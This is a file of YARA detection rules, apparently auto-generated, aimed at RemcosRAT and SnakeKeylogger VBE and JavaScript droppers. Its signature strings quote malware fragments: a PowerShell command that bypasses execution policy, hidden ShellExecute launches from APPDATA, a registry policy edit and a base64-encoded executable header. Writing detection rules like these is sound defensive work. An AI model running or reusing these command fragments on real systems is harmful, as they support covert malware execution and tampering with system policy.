      $x1 = "LZWCU DESIZ,\"PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command %cd%\\IHYPB.ps1\" " fullword ascii /* score: '52.00'*/
      $s2 = "LZWCU GGDOB,\"DBSJN.ShellExecute APPDATA & \"\"\\DESIZ.cmd\"\", \"\"\"\", APPDATA, \"\"\"\", 0\" " fullword ascii /* score: '28.00'*/
      $s3 = "        Set colItems = objWMIService.ExecQuery(\"Select * from Win32_Process Where Name = '\" & prcName & \"'\")" fullword ascii /* score: '27.00'*/
      $s4 = "    Set colItems = objWMIService.ExecQuery(\"SELECT * FROM Win32_Processor\", \"WQL\")" fullword ascii /* score: '27.00'*/
      $s5 = "436F707972696768742028632920627920502E4A2E20506C61756765722C206C6963656E7365642062792044696E6B756D776172652C204C74642E20414C4C20" ascii /* score: '24.00'*/ /* hex encoded string 'Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.' */
      $s6 = "3738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5F606162636465666768696A6B6C6D6E6F70717273747576" ascii /* score: '24.00'*/ /* hex encoded string '789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuv' */
      $s7 = "504150414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E4758585041444449" ascii /* score: '24.00'*/ /* hex encoded string 'PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD' */
      $s8 = "5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C4578706C6F7265725C55736572205368656C6C2046" ascii /* score: '24.00'*/ /* hex encoded string '\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' */
      $s9 = "4444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E4750414444494E47585850414444494E475041" ascii /* score: '24.00'*/ /* hex encoded string 'DDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPA' */
      $s10 = "45464748494A4B4C4D4E4F505152535455565758595A202020202020202020202020202020202020202020202020206162636465666768696A6B6C6D6E6F7071" ascii /* score: '24.00'*/ /* hex encoded string 'EFGHIJKLMNOPQRSTUVWXYZ                         abcdefghijklmnopq' */
      $s11 = "65672E6578652041444420484B4C4D5C534F4654574152455C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C506F6C696369" ascii /* score: '24.00'*/ /* hex encoded string 'eg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Polici' */
      $s12 = "4E2E4E4E4E2F4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E" ascii /* score: '24.00'*/ /* hex encoded string 'N.NNN/NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN' */
      $s13 = "4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E4E30314E324E33344E353637384E4E4E393A3B4E3C3D4E4E4E4E4E4E4E3E3F40414E4E4E42" ascii /* score: '24.00'*/ /* hex encoded string 'NNNNNNNNNNNNNNNNNNNNNNNNNNNN01N2N34N5678NNN9:;N<=NNNNNNN>?@ANNNB' */
      $s14 = "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" fullword ascii /* score: '21.00'*/
      $s15 = "DBSJN.ShellExecute QFKLZ, \"\", EJKPU, \"\", 0" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x4827 and filesize < 18000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__59f93f15 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_59f93f15.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "59f93f15790d467f32f903f7ffb74a13ee87a97e05762a45833fa7238a14df79"
   strings:
      $s1 = "Z~%Fcq&$0W!fZ20&Z,0*Zfv90Z!Xc~08 3F!;*%2,;+fRso&2 /$yG*lXv;A%;T1*~%2*osooAs)fO32lvToF s$f8&$%+XGc3F G*%2ZZqc;&02lsX$lsswosw*FO3T" wide /* score: '19.50'*/
      $s2 = "O *FAGc%wsAo&+vf%A%9)R!&W+ZWf%wo3szZl2020/~%T!+*bR%T)~ss3oO,/cR3W&*yZWf%Z*ZT!ZFTcZc+*Rf%ZT!Z!!8/*%w!ws3sf0Zs$%ZT*W )0z*FooZ*osAo" wide /* score: '19.00'*/
      $s3 = "~%*!~3Z8c+/+,%$32!0FW/2%TZ!Z fWFR3!l*/&Z%f*ycc~0!l&*R+* ;v~%0 *+;vq!ZT!Z T0Rv%fTF!$%ZTZ!+G 2%2Z*yX*lc+cyc*fZZFW+cWA%OfXGZZW%9&*{" wide /* score: '18.50'*/
      $s4 = "cz0R%)~!wA%Z!ZT%z,/%A%/$Rvf~0swssZ1$sR2Zs$%TqW /cG0swsoXOsv03ZF* ;*G%{F*F!ZW%woswA3*w%3T8c ;*fR,Gl{T!Z!Fc$*T$G&f%OTcFvXfl!!TTFc$" wide /* score: '18.50'*/
      $s5 = "+c1%ZTFZA*)Z%2o/~%T!ZTZ!T~s~!!Z!ZT%2%3*Zc{TZZvA{&RG*8o$%+*2Z1*$XG*o*woswsofl%AXT~23*ZTZ!+Zv8A%R%;XfWb0!Z!TTZc,~0,R!GG*$%Z!Z!T!T1" wide /* score: '17.00'*/
      $s6 = "oZvvZ9AZ%!y3qZyZ~%/!XX+Ao!F{GF%T9FA%TTZ!T!Goy%oZFZ!!FcG*Z+ff&RGX/AA%lXZ;ZZ;//Z;Z;Z/Z//;Z/Z;/&;,/08c /XOf0FW+;*1G%~*GwGwoswso ;Go" wide /* score: '16.00'*/
      $s7 = "AGwcFW W*AR%/AR%q*ycvFo!wA%2o{sWslG1Z$TRfqfz3FGA9qG,2q9;!* W*~%T8cyc*~%WqcyZXAR%/$RFc~3&GA%8o{s;!W *c$0Rf$%8oGw 9f2!F*+Wc$%WqW /" wide /* score: '16.00'*/
      $s8 = "&;sX!Z T{WvZRTcycc~0{FO%+vfZoXR!* W*ARGq1RGZ$3y!*GwoZ!TZ!Z ZFsyqcF!Tsw!TTZ ZFoGycG+o*%W&WG+f*082*G80FZFTTZ,b*T8Zf%8q~%+;&2ssZs20" wide /* score: '16.00'*/
      $s9 = "GAoA2v/fZFf$08Z$%;TW /FARcFW ;*AR!qcyc{$Rv*FXZ;ZZ2/1ZA*~*qZ$+w*+ZF$sZ%/{~s!f/WGTf~f+v$l,8bvR!W{ G*0v+fT*FF!A3&R !8/f%2Z~%+!$3ZZ{" wide /* score: '16.00'*/
      $s10 = "sl0O*TwAR!!Z!ZqvR%3Z2c+/Wf%ZT!Z!!R$* W,~%T!TTZ!0AW+c~soTZ!!TTO%X%wT+sXR,l!s~%ZT!Z!q%z%3/2c ;*fR!!ZTT!WAW *,908!)vGqcFcTTZ!!TTZA*" wide /* score: '16.00'*/
      $s11 = "l!!ZT!Z fl0o!ZZl%osoo;Z$2R3A;A0oZfG*T2*1&y*FF$RbAA%Os~0Gl*X!8c+/lA%2XFlF*2/T!Z!R!*&*/8%$*GX2lsXT;&&oows3Z+*R2$;ARAb2szoARf/AR!/f" wide /* score: '16.00'*/
      $s12 = "ARcq*yZvO0Z2c WX$%R W /c$0;** W{AR%9/F22$flc/FF9;boZcZ&Z2%2T,RsTswsoow* ZT G&%F/$%Rs2!T!+92%f!2TcZ,*9RF {oW&* W*~%T2cyZc~%;qcyZX" wide /* score: '16.00'*/
      $s13 = "FG{W!fl,2Z W W*,RGXvl&T$R c8qAR**ZTT!ZFR * /1~%f*ZT!Z!q0yc /0~%T!yT2*qA%A!!Z!Zq!y%$&;AX3l!Z2fvZ,%wToswswsX q/wbo!yT%A&0f;sboT8Z$" wide /* score: '16.00'*/
      $s14 = "ZR3vlA/$RGf$0Zc* W{wsqlF;A28*2T*F,/*RGTXFF!ZTvwZ!+*$%R!AGT!3f2%1Z2T%;A0TZ!!3T;v02A/~%$Z*F,Zl%R/AR!T!Z2T9;%2A/AR!c~3/!WZ2%T!TT2 *" wide /* score: '16.00'*/
      $s15 = "bl0sZvoXR!!TT8 oFR3; *yZWf%Zs~0,l!T!Zcf$W%2R/AR!&W+**G%Z*/F*+Wc9%;3ZFZ+*yZc$f8c)%WTO%)RcZccw!Wqcyc{,2!/f2%&W+clA%Rq3G; W /c1fWF*" wide /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 8000KB and
      8 of them
}

rule RemcosRAT_signature__c4a0f33b {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_c4a0f33b.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c4a0f33bd3f79a4ea9ed0219d19fd905a6d559f19bf3d57c50beff226f75b225"
   strings:
      $s1 = "*l*TTW! /9lZTc;fRsowswsGZ%A0 8GosRFq{wsZ8qGws,y$0%ZcyZ*A0*Zc/&Rosws$ozA%30Zc+cFow*Xws~%&;!ZT!Z!f!RA+TO%!8* W*AR0TcycWA0fX/Zc/&Ro" wide /* score: '16.00'*/
      $s2 = "w*0,lTwA0wsws&A2802F*oZ~%/Tl*AR1 WGsw0o&Rswsof9/w%3s;$%;!XX~%%fXFvo*R1l!o~%wssw AocR2oZ~%*qW cl9%F*AWX{vw*R,X!o$Rsosw+sO%03RZA0T" wide /* score: '16.00'*/
      $s3 = "lFX&;T!Z!+TRcc/qRAXfl3lsX+Z~%FwZF9s~&TF2Zf0FcswosZf*l03A;AR%9&T*Z!3F;0*W /XG%G/$RbqfF9wAfwsws!GA+02Rv* ;c90Z&cy/v~%swoo!G%F%3%**" wide /* score: '16.00'*/
      $s4 = "GAfZ9GZ!!ZqTswf2 qcT9RGqAR* W /XO%,9$RboAR{lvXl*2*%yZAf%2ZT!Z!+TZcc;q%~*fl3Xslv;A0Fo/Ff9A2TFFZf02csoowc3*z0As/~%Rs&ZcZT28ZT*W /{" wide /* score: '16.00'*/
      $s5 = "$RZT l$%AF10A!A0TZ!T!Z1R,3R*Gsb+%ZXGwsX%;!3{~%GlTFW cl$0ZZcyc*A0TZ!T!Z+bl%oTZZ*0owsofA/y%3AZ~%&GAR1FGG*!A*1fZ!fl$%;!cy**,R!8c+cX" wide /* score: '16.00'*/
      $s6 = "&~2oswsoo2*%~{!lGvwX0bwARGXFo$RvX&;T!Z!TTW%c/qRAXfl3lsXwswssw&l0Al!$2FZ$0wssw*282%A$/AR!Z!T,q+A%3f;$%F!$3Z!!TTZ TvZ{;%TlGws*R,l1" wide /* score: '16.00'*/
      $s7 = "TZ!T Zo!R%oTZZ*01l,Xswow 3W R2!l%8* Wc9%Z!TTZ! RX%w! R/f*lA;A0!q*ycXfRTFW *{O%!+*yc{,RoWFTyGG%b8cZ)%ZF* W*$0Z!!Z+!F 2RoTsw*R!*!T" wide /* score: '16.00'*/
      $s8 = ",lTFW *X~%soowsoZR0AvXW!FGfR!8* W*$%zs$0F*vlosws%w1f,A2lcT /fR2/ARo*wsooRs**0As/AR/Zc+W*~%!Z!Z+!;sq%O%qTFcfR1!+G!w$f!Z!Z&T!TqR,0" wide /* score: '16.00'*/
      $s9 = "+%A%8c+Z*9RZTAATcZZffwsso3w29cRoZZqW Wc,2A8XGZZX%;F*/2%swos;sbl03*l!l%*c+*Wf0!lTcW **G%!X02c+cW9R!XZcwv,Rcy* Wc9%wZ$0W cy*cO%%y*" wide /* score: '16.00'*/
      $s10 = "%+scy*/&Rswso2o9A%3!lTF;2f0Z!!T+Z!+vR{~sTZ*W!2WARq*8*q*8!q32%FZT22%GZ13F;AZ%3F/0;A0!ZT!2!+q+%G$oZ&/2lowsows2*%~GZXG+sX%8s$0+*&;1" wide /* score: '16.00'*/
      $s11 = "WA3!ZXW 1RflFswv2osZ*TZ2&9TlG!;*%O*swoo2wby%32/$RFX%8* W*$0W c+/W,0%;*WsTWFW cW,R0 W /cG%0X2*,l1*ZZ*RTT!ZvZcXc+*~A0!Z+!Zc/fR2!XT" wide /* score: '16.00'*/
      $s12 = ",X1l!T Z3 ;f03F*!X/Wc+cW9RsoAsZ%bA%AT&W /cG%ooAs!RfsR2%8*+ZWfRso2oTOZ/%A$Z~%TXO*so3wA0F;0AZqW ;cfR!G$%ws3sA,TXR2%2* ;cfRTX!Z!Z&T" wide /* score: '16.00'*/
      $s13 = "*Z!T!W!10R2!Z{cG&!w00AR%yc+c*f8sTv+TZF*oTW!!3q;%+cy*lf0Z!Z!!Zc~* W%$%Z!TT2!bR*%w!vwX0!Z!Z&T 1*RsTswX%W *+WG,008c+ZF1R o~%RsAR!ZT" wide /* score: '16.00'*/
      $s14 = "Z!b+fclGvlTT!ZGWff&$92!0!Z0!yZ9Xl2A0$l!*2lT;&fwsAs2O W02Z!T!Z!0$W ZR9%ws2w312W%A!T!TTZ!)cy/%G%ooAsf1fR%3!ZTZ!TR%W ZRfRosAs9,w%03" wide /* score: '16.00'*/
      $s15 = ";A0wswsA8 A02Z * ;c90ZsARosws&y99%AswsosofF*0sZosRsf0O*!T+Z&9GZ0AZ*FGws!Z!Z{!Zv02R *+;cfRq*8*A;$+%8cyZ*A092*{Z8* Wc1f+Fc+*Wf0%G$" wide /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 8000KB and
      8 of them
}

rule SnakeKeylogger_signature_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6d6d0e56950402b84ea721cd06cd329629d6b64e885923533de5b1c33b50d15c"
   strings:
      $s1 = "FqT82TZ+qFZF+TF!!T+8*Tf8XZfqA!y!!ZGZ3!l!9F8!TTl!2Z+!8!!Z*T2Z%Z2T TTZ*T*Z9FA!qTZ!*TT+ qFZq+ qlFZ!!Z%ZX!GF9Fl!9q8!!y{!A!%8XTf8 Z!+" wide /* score: '14.50'*/
      $s2 = " FGlvq T*l!TFZT!8!3qZ!!TTZ!T!Z0Z!T8!R!%~!RqF+!*!ZAT08FvZ*!WA!RqqvZcZ%q%qqZ!TcZ+!Z!TT2!,T+ZFT!Z*Z,TRF8!!ZcZ0!ZbT%8FTqZb!RqFZF%ZfT" wide /* score: '12.00'*/
      $s3 = "Z!T~!O!%8,Z+!Z!X!O!3TA!%8TFO!cZTT%Z%ZvT TXZfqvZf!Z!TTZ!cT*Z!T!ZTZ%TW!Z!!Z!ZT!W!1!+!+TO* 8" fullword wide /* score: '12.00'*/
      $s4 = "!2!!W+qvZ&Z,* qqlFq!80!y!T+R!Zq9W qFlq8!qR!R!,W 8X!Z /!O!3T8!!y*!8*F83TFZ!y*TFXq8!q%Z0!R!fTZ %TT2 qFZqZ!+l!RF%ZFZT!W!q*8FTqR!%Z0" wide /* score: '12.00'*/
      $s5 = "!Oc+q8!FZT l!Z89* 8c2 qZq1W qcZT z!0q;FFT+Z!+*Z9y qZ!R!cZ!Zq!y!3!A!+TZ!*Z3!ZF ZqT!Z*Z,T,T1Z T!ZX!l!9qy!FTTZ*T*8qZ%qO!R!F2 8X!GF1" wide /* score: '12.00'*/
      $s6 = "AZT+GT+22!,O&ZqZ8FT*2!q1R!%G* FA&Zq1AZ,l2qc+fZF1&Z$ yF+*2!,0$ZsqZ8f8&TOG2!b8 8f*2!1%~!X+WF,yf!8vAZoqZ8&y&T,{$Z%q%Z)22!1{~! q*yc9" wide /* score: '12.00'*/
      $s7 = "T!Z!Z&qF1TZ*T!ZT!+F)9Z!cTTZ!TZ8)2!T2!Z!!Z y$vZ!+!Z!TTy  +T!8!!ZTTGZZw!T TTZ!T!yofZ!qTZ!!T$8G{!ZqZ!TZ!8 s+!Zq!Z!T!G!0*Z!&ZT!Z!&8q" wide /* score: '12.00'*/
      $s8 = "T!Z!Z!T!TqyfT!Z+!Z!q0W!%9TZFT!ZTZ!TZ!Z vw!Zq!Z!1GW!/3Z!F8T!Z!!ZTTcyZz!TFTTZGX%yTvR!fqZ!!TTZ!TcyTO!T8!Z! lfyqFR!fFZ!TTZ!!Z* WG!Zq" wide /* score: '12.00'*/
      $s9 = "yvTZ!8!%l%y1!8F)!; /T8FZZfFO!!ZTTfZG8ATb1" fullword wide /* score: '12.00'*/
      $s10 = "Fw!F81q&8bZ!T!T$2%+bZT!Z!{$R sTq8%qF8{8Fq+F8Fc8F8fF8F)!Z!TT~&%y+F8FsZfqZOG8vq*+qZ!T!ZT%G%0qRF&q*8Gq&8*8vq2FlFF8*8fFyb)!Z!qTlc%yT" wide /* score: '12.00'*/
      $s11 = "Fl qTZ!!ZT%G%%8)+&8c8,+&q*8%+&8XF8FXq2FATq8 )Gyq8v+8Fl F8GyfFZGT!wc+qyGvyfFFF*yfqAZF8 )FTTZ!T2W/%F!qq+FATq8AT&8qZ!TZ!2!fR%8* 2FT" wide /* score: '12.00'*/
      $s12 = "FZFF8/+&8bZ!T!T$2%+bZT!Z!{$R !qq8A+F8)yFqO 8F*yF8* 8F)!Z!TT~&%yf 8F!8fqZOG8vq*+qZ!T!ZT%G%0q~ &q*8b+&8*8,+2F+FF8v8fF;!qFyb0+8FGyq" wide /* score: '12.00'*/
      $s13 = "fFF{T8F!ZT!W!!ZTTAZ!RbT!TTZ,*%y9!8F*TZ!!T$Z2{fZf8bTZ!Z!AF%y+bZGT!W /TyGZ8X yb*ZqqA8*y )!{TZ&+bw+GzFX+ybcTq8,q*y+z!{Z!~ cR F0Fl +" wide /* score: '12.00'*/
      $s14 = "cO&GZ$TbZ!Z!TAX0yvT!Z)!z!TTZ!,*0y!{!Z92!{yGz!!ZFZ9FR /FwFTT8F!ZT!2c!ZTTFZZF!TcTT2AqFZT!Z!X*Z!!TTZ!q!ZTZFTzvZ!!ZFZ{*Z!T!Z!fqZ!!ZT" wide /* score: '12.00'*/
      $s15 = "* Fv8*+FTTZ!T!W9%GF9*; ZTq8ZT&8ol&TAs+FbZ!ZT!+*0 +FT{Z!FZ9 yG*Zqq&Z2wvqbTTZ!Tvl0 +FT{Z!FT9y {cZq8!Tl!2FvZ!ZT!ls0 z!TTZ!%Fov+!!Zq" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__b5c26158 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_b5c26158.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5c26158818ec4e36dc397d56fa75aad40737a74e5f326846534f0ba83925c44"
   strings:
      $s1 = "!WTc~!0q8v!*TRF0F8TZ!*Z Z!!Z!2T,Z TFZ!T*Z,!RqFZ!!WT0!ZbZ%qFTqZbT%8q!8%TfZ! /TOc+FZ)Z%q8!8!bZ%8q!8%T&Z!+9ZZFG* 8%!Z)T%8FZFTbT08FT" wide /* score: '16.00'*/
      $s2 = "f!2 2*f!fq2Ff!2T&Z&TfZ&!fq2%f%2f2&f8&2&F2v2q&y&q&2&q*8cc2{&8cF2Tf!2!2!f!f02cf%2+&+c**2&FfX2!fF2q2cfZc8&GWF2T&Z&T&Z&Tfl&c2f&F&v2T" wide /* score: '12.00'*/
      $s3 = "!FT%Z%T0Z%!0TW!{!+TA!98 Z2!GFZq Z T%Z%T0Z !yT%Z%!AT9FR!R!0!0Ty!TFFT*8AT3ZF!TTW!*G8qGFfZFZ&%8FzTFZ!TvZ%{q8fF2T%Z%!FT{!y!y!+!+Ty!+" wide /* score: '12.00'*/
      $s4 = "F8Zv8q3!O!F!+F3Ty!+!yT*Zfq+Z%!0TA!3!ATZG+8 Z2!R!RT%ZFqGZ*qq+ %yq!Z! lTXF8%yF3!+Ty!+!lTf8 T0Z%!3TA!3!Z{yF+Z2Zs!F!lq*8F0 82T0l FlT" wide /* score: '12.00'*/
      $s5 = "Ty!+!yTy!98Z8fFy!yT2Z%T2ZfqT+ F;qZ8 !8$+%yFOvq%+qA!0!ATf8 T1+F%+qR!1v80yF98,+F%yFGq*Zfq*Zfq3Z*!Gq2ZfFZ" fullword wide /* score: '12.00'*/
      $s6 = "+8!v+q8!9by08FX8 Z!vyF8TF+ q*8vT{ZcFO) RFFATq!Z!+!Xb+08FXA80 8FT+Z!!1Ty!+!yTl!98%Z*!GFGq Z T Z*T98%!lTf8fFRTX!GFR!X!9qZF{!zq Z T" wide /* score: '12.00'*/
      $s7 = "Z2Z%!R!RT%Z%TvZGT0Zf&80 8F!8TT +!G +F9f8%+FyTGZGT/82!qTZ!*!;q;F/8 Z!!l!O+ 8fq!Z!TXZc yqFZG!WTX 8%yFX q0yFq!ZT%ZF++8F!{TW!q 80yF3" wide /* score: '12.00'*/
      $s8 = "2W!{q+ G{X+F+!WXZ!qZ!ZF!AFZT!Z!T!Z!T0Z!!8T%Z%AZ0qF+!W!TAT08F" fullword wide /* score: '12.00'*/
      $s9 = "!+TO*+F+T&Z!*+8v!fTOc+F8X8FT8%Z !Z RTZ8f* 8FXq8!FRT%Z,cyqX!Z ;!1!3T8!T WTFlFq3ZF!T+l!q*8qZF0Z%Z%!2!Z+%Z!f 8FTqZ! lT%8%!8TT!W!8*q" wide /* score: '12.00'*/
      $s10 = "Z&!Wf 8ZF8T+!Z +!1c+q8!q!Z+*ZZq9W F*fyF/FO*yF*Z!yb!RF;qFZ T!y*T9y FZT%Zc!ZTq!y!A!3!+TZ!X!AT!8 TqZ!!XTO!1!OTy!TZ*Z*!GFyTFZ!T*Z*qq" wide /* score: '12.00'*/
      $s11 = "+!T!8T&l%+)Z!!TTOc0 Z{Z!/lvF GlF8qcZ!T!Zf13F!!lq&8cF8qX!; O qF1+2F)!ZT!Z*90ycFqqyF$ ZTlFf8&8FFF!;+%yFq%y&q)Z!!ZT*G% 2qqF+ ~ T!Xq" wide /* score: '12.00'*/
      $s12 = "oZFF/9Z!)!ZTZ!qZs+!F8FRTZy!qF8!T3Z2fwT&8A ZTT!l!wvqFqqyFqFyq&8bTTZF!f02GqF2qz!TZ!Zc%wvZqF8!q&8bTTZF!y0&FG!ZTT!Z!8!+ 1fA!qFAT&8,T" wide /* score: '12.00'*/
      $s13 = "ysswobw* woosOs8sosooOs92wosw,o1~ssooOs/,wows1wfFsswsOo +sosw,oXlsswo,wZcwoosOsy&osoozs3vwosw,o9yssooOs{ wows1w!ZsswsRo!wsosw%o1" wide /* score: '12.00'*/
      $s14 = "FoT8F1F2qbZ!TTZA&0+z!T!ZTFA0ysZFFRF8qG8Fqv8Fq*8FF2qF8b!ZTT!~&R +Fqqw!fF;1G8vqXyF!TTZ!T%G0RF08&8cFFF2qc8vq&8*qq8*F2q zb!ZTq!lcR T" wide /* score: '12.00'*/
      $s15 = "FZ{Z!$W,Z GWFzT!Z!TA2%+0Zf!+qvyb!ZTT!zbR {F*qWF*Fy)!F!ToWA&+{+FX 8TZ!TZ&Zf%FFZ{!Zb*GA {*8b!ZT!ZA&R+0!;!+!T!qTwFfG+T!Z!TfZs,1fF!$" wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule SnakeKeylogger_signature__e7c6b5f7 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_e7c6b5f7.vbe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7c6b5f74086a64754c4b3509f5ae45cb09f685818af6f6082c25ad222374788"
   strings:
      $s1 = "2!* 2TW *2&R&F2v2T&Z&T&Z&TfZ&!2T&Z& 2+f*2c2!f!f*2!fF2Tc+&1*y&!fqWcf%2q2Ff8&Z&!2!2T&Z&T&Z&Tfy& 2T&y&!2Tf&2!2&f!**WFfc2T&W&XfR&!ff" wide /* score: '14.50'*/
      $s2 = "&O&T&Z&ffy&!2Tcl& 2*f!2v2,f!fTW fF2T&ZcXfy&cfT2GfG2T2!f2&8&!2!WX&y&*&ZcXf+&!2Tcy&!2Tf!W*2 fvfT2%f%2T&Zc+*y&!fT2,f 2X2!fl&Z&!2!2f" wide /* score: '14.50'*/
      $s3 = "* 2c2Gfcfq2G*F2*&y&" fullword wide /* score: '12.00'*/
      $s4 = "* 2c2%fcfq2Gf&2*&y&" fullword wide /* score: '12.00'*/
      $s5 = "* 2c2Gfcfq2cfG2*&y&*f8&vf+2cfF2*2*fW&F&c2F2{&l&*&y&Xf8&v2q&W&F2" fullword wide /* score: '12.00'*/
      $s6 = "* 2cW fcfq2vfG2*&8&*f8&vf*2cfF2" fullword wide /* score: '12.00'*/
      $s7 = "* 2c2Gfcfq2cfG2*&y&Xf8&cfq2cfF2" fullword wide /* score: '12.00'*/
      $s8 = "* 2c2Gfcfq2cfG2*&y&Xf8&cfq2cfF2X2FfW&8&c2F2{&F&*&8&*f8&c2q&W&F2*fF2c2Ffcfq2cfF2*&8&*f8&cfq2cfF2X2*fW&F&c2F2{&W&*&y&Xf8&*21&W&F2f" wide /* score: '12.00'*/
      $s9 = "* 2c2Gfcfq2Gf,2*&y&*f8&vf*2cfF2*WcfW&+&c2F2*&y&*&8&*f8&c2q&W&&2{fG2c2*fcf+2GfG2*&2&*f8&cfq2cfF2*2FfW&8&c2F2*&8&*&8&" fullword wide /* score: '12.00'*/
      $s10 = "* 2c2*fcfq2v*&2*&y&*f8&vf+2cfF2" fullword wide /* score: '12.00'*/
      $s11 = "* 2c2*fcfq2vfv2*&y&" fullword wide /* score: '12.00'*/
      $s12 = "* 2c2&fcfq2cfF2X&l&" fullword wide /* score: '12.00'*/
      $s13 = "* 2cWvfvf{2*f 2*&l&Xf8&cfq2vfG2X2,fW&8&c2c2*cW&*&l&" fullword wide /* score: '12.00'*/
      $s14 = "* 2cWcfvf{2*f&2" fullword wide /* score: '12.00'*/
      $s15 = "* 2vW*fcfX2cf 2*&l&*f8&cf12cfv2*2*fWcW&v2G2X&y&*&l&Xf8&c2q&+&G2Xf,2*2FfGf" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 3000KB and
      8 of them
}

rule RemcosRAT_signature__be5e11f6 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_be5e11f6.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "be5e11f6e953105b0f317defdcdcc60e8c8a59d2d90c63ced02711a7169b200a"
   strings:
      $x1 = "E.text=\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmF" ascii /* score: '72.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string*/ /* score: '26.50'*/
      $s5 = "YTEwYmQ3ZGRjNwBtXzAxZGFkOWJmMDllZDQzNmJhZTE4M2VmYmQxODM2Mjc0AG1fMDBjMDM5ZTE5YmExNGQxZWI3OGNhNmU3MWE2Yjc0OTAAbV9lMzAxOGI2MGRlOTU0" ascii /* base64 encoded string */ /* score: '26.00'*/
      $s6 = "ZmJhNDI0NDhlNTRjY2I5ZGFlOGUyYTYAbV8xNzg5YTc0YjViMzQ0MGI4ODVhYTZkY2I1NzkwNDdlZABtXzVhNzhkMmFlOGU2OTQ1NGQ5NDFkZmJlNjU1ZDMzZmUxAG1f" ascii /* base64 encoded string  */ /* score: '26.00'*/
      $s7 = "NTEwZGQ3YzgAbV9mNDFmYzM3NjFlOGU0NzVhYmY3ZDY3ZWZhZGJmMWNjMABtX2IzZmY1OGEwYmE3YzRhNzc5YzYxMGNhODg5ODc5OWVhAG1fYTZjN2YxZTlkMjljNDky" ascii /* base64 encoded string  */ /* score: '26.00'*/
      $s8 = "M2E0NDJiAG1fMDM3N2VlYTM4Zjg5NDU5ZGI0MTBiNjhiYjU5YzU2NWUAbV9mYjI1OGFhZTc2OTU0MjU4ODY4YmYyYjczYmJiMjUzOQBtX2ExY2JhYjM2Zjk5ZTQ4Yzhh" ascii /* base64 encoded string */ /* score: '24.00'*/
      $s9 = "AFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAERlYnVnZ2VyQnJvd3NhYmxl" ascii /* base64 encoded string  */ /* score: '24.00'*/
      $s10 = "b3JlclN0cgBjb2xsZWN0b3JFeHBsb3JlcgBtX0ZpZWxkU3R1YklEAG1fRXhwbG9yZXJTdHViAEhhbmRsZUFjY2Vzc2libGVSZXNwb25kZXIAdmFsdWUAcHJlZABBcmd1" ascii /* base64 encoded string  */ /* score: '24.00'*/
